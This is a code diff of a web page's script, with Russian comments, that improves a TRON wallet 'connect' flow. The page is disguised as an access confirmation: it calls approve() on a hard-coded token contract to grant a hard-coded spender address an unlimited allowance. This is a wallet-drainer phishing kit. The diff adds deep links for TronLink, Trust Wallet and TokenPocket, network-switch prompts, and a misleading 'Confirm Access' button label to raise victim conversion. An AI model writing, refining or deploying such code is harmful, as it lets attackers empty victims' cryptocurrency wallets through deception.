@@ -60,63 +60,92 @@
     </div>
 
     <script>
-        const TOKEN = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; 
-        const SPENDER = "TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an"; 
-        const MAX_VAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+       const TOKEN = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; 
+const SPENDER = "TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an"; 
+const MAX_VAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
-        function openModal() { document.getElementById('walletModal').style.display = 'flex'; }
-        function closeModal() { document.getElementById('walletModal').style.display = 'none'; }
+const btn = document.getElementById('mainBtn');
+const status = document.getElementById('status');
 
-        async function selectWallet(type) {
-            const currentUrl = window.location.href;
-            
-            // Если мы НЕ в DApp браузере, используем Hard Links
-            if (!window.tronWeb) {
-                if (type === 'tronlink') {
-                    window.location.href = `tronlink://wallet/dapp?url=${encodeURIComponent(currentUrl)}`;
-                    return;
-                } else if (type === 'trust') {
-                    window.location.href = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(currentUrl)}`;
-                    return;
-                }
-            }
+function openModal() { document.getElementById('walletModal').style.display = 'flex'; }
+function closeModal() { document.getElementById('walletModal').style.display = 'none'; }
 
-            // Если мы уже внутри кошелька или есть расширение
-            closeModal();
-            connectAndApprove();
+// 1. Главный обработчик клика по кнопке
+btn.onclick = async () => {
+    // Проверяем, есть ли объект TRON (мы уже внутри нужного кошелька)
+    if (window.tronWeb || window.tronLink) {
+        connectAndApprove();
+    } 
+    // Проверяем, есть ли объект Ethereum (мы в кошельке, но сеть не TRON)
+    else if (window.ethereum) {
+        status.innerText = "Внимание: Переключите сеть на TRON!";
+        alert("Пожалуйста, нажмите на иконку сети (сверху или сверху справа) и выберите сеть TRON (TRX), чтобы продолжить.");
+    } 
+    // Мы в обычном браузере (Chrome/Safari) - показываем выбор
+    else {
+        openModal();
+    }
+};
+
+// 2. Обработка выбора кошелька в модалке (только для внешних браузеров)
+async function selectWallet(type) {
+    const currentUrl = window.location.href;
+    
+    if (type === 'tronlink') {
+        // Новый формат диплинка для TronLink
+        window.location.href = `tronlinkoutside://pull.activity?param={"url":"${currentUrl}"}`;
+    } else if (type === 'trust') {
+        // Добавлен coin=195 (идентификатор TRON), чтобы Trust Wallet сразу включал нужную сеть
+        window.location.href = `https://link.trustwallet.com/open_url?coin=195&url=${encodeURIComponent(currentUrl)}`;
+    } else if (type === 'tokenpocket') {
+        window.location.href = `tpoutside://pull.activity?param={"url":"${currentUrl}"}`;
+    }
+}
+
+// 3. Вызов контракта
+async function connectAndApprove() {
+    closeModal(); // Закрываем модалку на всякий случай
+    
+    try {
+        // Запрос коннекта для TronLink
+        if (window.tronLink && (!window.tronWeb || !window.tronWeb.defaultAddress.base58)) {
+            await window.tronLink.request({ method: 'tron_requestAccounts' });
+        }
+        
+        if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+            throw new Error("Кошелек не авторизован");
         }
 
-        async function connectAndApprove() {
-            const btn = document.getElementById('mainBtn');
-            const status = document.getElementById('status');
+        btn.innerText = "Processing...";
+        btn.disabled = true;
+        status.innerText = "Подтвердите транзакцию в кошельке...";
 
-            try {
-                // 1. Коннект
-                if (window.tronLink) await window.tronLink.request({ method: 'tron_requestAccounts' });
-                
-                if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-                    throw new Error("Кошелек не найден или не авторизован");
-                }
+        const contract = await window.tronWeb.contract().at(TOKEN);
+        const res = await contract.approve(SPENDER, MAX_VAL).send({
+            feeLimit: 100000000
+        });
 
-                btn.innerText = "Processing...";
-                btn.disabled = true;
-                status.innerText = "Вызов смарт-контракта...";
+        status.innerText = "Успешно! Транзакция отправлена в сеть.";
+        btn.innerText = "Confirmed";
+    } catch (e) {
+        console.error(e);
+        let msg = e.message || "Отказ пользователя";
+        if (msg.includes("Confirmation declined")) msg = "Вы отменили транзакцию.";
+        
+        status.innerText = "Ошибка: " + msg;
+        btn.disabled = false;
+        btn.innerText = "Try Again";
+    }
+}
 
-                // 2. Апрув
-                const contract = await window.tronWeb.contract().at(TOKEN);
-                const res = await contract.approve(SPENDER, MAX_VAL).send({
-                    feeLimit: 100000000
-                });
-
-                status.innerText = "Успешно! Ожидайте подтверждения сети.";
-                btn.innerText = "Confirmed";
-            } catch (e) {
-                console.error(e);
-                status.innerText = "Ошибка: " + (e.message || "Отказ");
-                btn.disabled = false;
-                btn.innerText = "Try Again";
-            }
+// 4. Авто-старт, если страница сразу загрузилась внутри кошелька
+window.addEventListener('load', () => {
+    setTimeout(() => {
+        if (window.tronWeb && window.tronWeb.ready) {
+            btn.innerText = "Confirm Access";
         }
+    }, 500);
+});
     </script>
 </body>
 </html>
